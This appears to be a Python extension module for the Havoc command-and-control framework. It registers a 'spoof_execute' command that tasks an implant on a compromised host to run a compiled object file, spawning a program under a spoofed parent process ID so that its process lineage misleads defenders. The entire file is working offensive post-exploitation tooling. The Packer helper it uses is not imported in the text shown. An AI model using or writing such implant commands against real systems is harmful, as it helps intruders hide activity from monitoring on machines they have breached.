from havoc import Demon, RegisterCommand, RegisterModule

def spoof_execute( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    ppid = ''
    program = ''
    argos = ''

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return True
    elif num_params == 2:
        ppid = params[0]
        program = params[1]
    else:
        ppid = params[0]
        program = params[1] + '\x20'
        argos = '\x20'.join(params[2:])

    try:
        ppid = int( ppid )
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid PPID" )
        return True

    packer.adduint32(ppid)
    packer.addWstr(program)
    packer.addWstr(argos)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to Execute Process SpoofPPID" )

    demon.InlineExecute( TaskID, "go", f"dist/spoofSpawn.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand(spoof_execute, "", "spoof_execute", "Spoof PPID execute a process", 0, "<ppid> <program abs path> <args>", "" )
